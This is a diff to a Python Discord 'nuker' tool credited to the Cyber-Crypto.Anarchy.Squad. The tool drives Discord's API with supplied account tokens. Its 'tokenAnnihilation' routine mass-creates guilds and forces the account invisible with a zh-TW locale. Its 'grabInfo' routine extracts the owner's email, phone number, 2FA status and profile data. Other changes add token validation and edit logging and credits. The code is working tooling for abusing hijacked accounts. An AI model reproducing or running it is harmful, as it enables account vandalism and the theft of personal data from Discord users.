@@ -22,7 +22,7 @@ version1 = dataProject.json()["Version"]
 with open("metadata.json", "r") as f:
     config = load(f)
     currentVersion = config["Version"]
-    if currentVersion < version1:
+    if float(currentVersion) < version1:
         updateStatus = "Update the utility using item 18"
         updateSoft = True
     else:
@@ -287,12 +287,12 @@ intro = f"""
  
  [ C.A.S ]~>           [{updateStatus}]
  
- [ Discord Tool Set. 
- [ version {currentVersion}       
- [ Created by Cyber-Crypto.Anarchy.Squad
- [ Telegram C.A.S - https://t.me/anarchy_squad
- [ Original - https://github.com/TheWay-hue/C.A.S-Discord-Tool-v4 ]
- [ Forked and updated by https://github.com/ArtikUSB ]
+ [ Discord Tool Set. ]
+ [ version {currentVersion} ]       
+ [ Created by Cyber-Crypto.Anarchy.Squad ]
+ [ Telegram C.A.S - https://t.me/anarchy_squad ]
+ [ Original version: https://github.com/TheWay-hue/C.A.S-Discord-Tool-v4 ]
+ [ Forked and updated by https://github.com/posreadyxp ]
  
  [1] Grab Info.
  [2] Annihilation.
@@ -1606,25 +1606,28 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     json=setting,
                 )
                 if req.status_code not in statuses:
-                    errorLog.write(
-                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
-                    )
+                    # errorLog.write(
+                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
+                    # )
+                    print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
                 req = post(
                     "https://discord.com/api/v8/guilds", headers={"Authorization": token}, json=payload
                 )
                 if req.status_code not in statuses:
-                    errorLog.write(
-                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
-                    )
+                    # errorLog.write(
+                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
+                    # )
+                    print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
                 req = patch(
                     "https://discord.com/api/v8/users/@me/settings",
                     headers={"Authorization": token},
                     json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
                 )
                 if req.status_code not in statuses:
-                    errorLog.write(
-                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
-                    )
+                    # errorLog.write(
+                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
+                    # )
+                    print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
                 d = d + 1
             print("\nStarted gliched.")
             while True:
@@ -1772,47 +1775,47 @@ def grabInfo():
         select = str(input("\nSelect: "))
         if select == "1":
             token = input("\nToken: ")
-            headers = {"Authorization": token, "Content-Type": "application/json"}
-            request = get(
-                "https://canary.discordapp.com/api/v8/users/@me", headers=headers
-            )
-            if request.status_code in statuses:
-                userName = (
-                    request.json()["username"] + "#" + request.json()["discriminator"]
+            if validToken(token, for_nuker=True) == "Valid.":
+                headers = {"Authorization": token, "Content-Type": "application/json"}
+                r = get(
+                    "https://canary.discordapp.com/api/v8/users/@me", headers=headers
                 )
-                userID = request.json()["id"]
-                phone = request.json()["phone"]
-                email = request.json()["email"]
-                mfa = request.json()["mfa_enabled"]
-                bio = request.json()["bio"]
-                avatar = request.json()["avatar"] if request.json()["avatar"] is not None else 'Default'
-                banner = request.json()["banner"] if request.json()["banner"] is not None else 'Default'
-                banner_color = request.json()["banner_color"]
-                locale = request.json()["locale"]
-                nsfw = request.json()["nsfw_allowed"]
-                verif = request.json()["verified"]
-                print(
-                    f"""\n
-      User Name: {userName}
-      User ID: {userID}
-      Bio: {bio}
-      Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.png" if not avatar == "Default" else avatar}
-      Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.png" if not avatar == "Default" else banner}
-      Banner color: {banner_color}
-      Locale: {locale}
-      NSFW allowed? {nsfw}
-      2 Factor: {mfa}
-      Email: {email}
-      Verified? {verif}
-      Phone Number: {phone if phone else 'None.'}
-                """
-                )
-            else:
-                if request.status_code not in statuses:
-                    errorLog.write(
-                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
+                if r.status_code in statuses:
+                    userName = (
+                        r.json()["username"] + "#" + r.json()["discriminator"]
                     )
-                print(token + " Invalid.")
+                    userID = r.json()["id"]
+                    phone = r.json()["phone"]
+                    email = r.json()["email"]
+                    mfa = r.json()["mfa_enabled"]
+                    bio = r.json()["bio"]
+                    avatar = r.json()["avatar"] if r.json()["avatar"] is not None else 'Default'
+                    banner = r.json()["banner"] if r.json()["banner"] is not None else 'Default'
+                    banner_color = r.json()["banner_color"]
+                    locale = r.json()["locale"]
+                    nsfw = r.json()["nsfw_allowed"]
+                    verif = r.json()["verified"]
+                    print(
+                        f"""\n
+        User Name: {userName}
+        User ID: {userID}
+        Bio: {bio}
+        Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.png" if not avatar == "Default" else avatar}
+        Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.png" if not avatar == "Default" else banner}
+        Banner color: {banner_color}
+        Locale: {locale}
+        NSFW allowed? {nsfw}
+        2 Factor: {mfa}
+        Email: {email}
+        Verified? {verif}
+        Phone Number: {phone if phone else 'None.'}
+                    """
+                    )
+            else:
+                errorLog.write(
+                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Token is {validToken(token, for_nuker=True)}]\n"
+                )
+                print(f'{token} is {validToken(token, for_nuker=True)}')
         elif select == "2":
             print(menu)
             select = str(input("\nSelect: "))
@@ -1868,7 +1871,7 @@ while True:
         elif select == "3":
             Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses)
         elif select == "4":
-            validToken()
+            validToken(token=None, for_nuker=False)
         elif select == "5":
             joinToken()
         elif select == "6":
